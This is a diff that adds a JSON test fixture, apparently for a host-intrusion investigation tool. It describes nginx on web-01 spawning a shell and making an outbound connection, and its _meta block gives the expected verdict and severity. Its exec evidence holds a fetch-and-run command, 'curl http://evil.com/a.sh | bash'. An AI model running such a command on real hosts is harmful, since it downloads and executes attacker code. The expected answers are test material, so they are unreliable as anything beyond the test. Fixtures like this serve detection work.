@@ -1,0 +1,57 @@
+{
+  "investigation_intent": "识别 web-01 对外监听进程的高危命令与外连",
+  "scenario": "S5",
+  "risk_modules": ["exec", "connect"],
+  "params": {
+    "host": "web-01",
+    "time_start": "2026-06-21T08:00:00+08:00",
+    "time_end": "2026-06-21T20:00:00+08:00",
+    "listener_ports": [443, 80, 8080],
+    "severity_floor": "P2"
+  },
+  "completeness_precheck": {
+    "overall_verdict": "full_traceable",
+    "confidence": 0.9,
+    "next_skill_blocked": false,
+    "data_gaps": []
+  },
+  "evidence_bundles": {
+    "host_exec": [
+      {
+        "evidence_id": "exec-001",
+        "event_type": "exec",
+        "host": "web-01",
+        "timestamp": "2026-06-21T09:15:22+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1234,
+        "pid": "5678",
+        "ppid": "1234",
+        "exe": "/bin/bash",
+        "command": ["/bin/sh", "-c", "curl http://evil.com/a.sh | bash"],
+        "cwd": "/var/www/html",
+        "comm": "sh"
+      }
+    ],
+    "host_connect": [
+      {
+        "evidence_id": "connect-001",
+        "event_type": "active_connect",
+        "host": "web-01",
+        "timestamp": "2026-06-21T09:15:25+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "listener_pid": 1234,
+        "dst_ip": "203.0.113.99",
+        "dst_port": 443
+      }
+    ],
+    "host_file_op": []
+  },
+  "_meta": {
+    "scenario_label": "S5 nginx 子进程 curl|bash 下载执行 + 外连",
+    "expected_overall_verdict": "high_risk_detected",
+    "expected_highest_severity": "P0",
+    "expected_risk_items_min": 2
+  }
+}
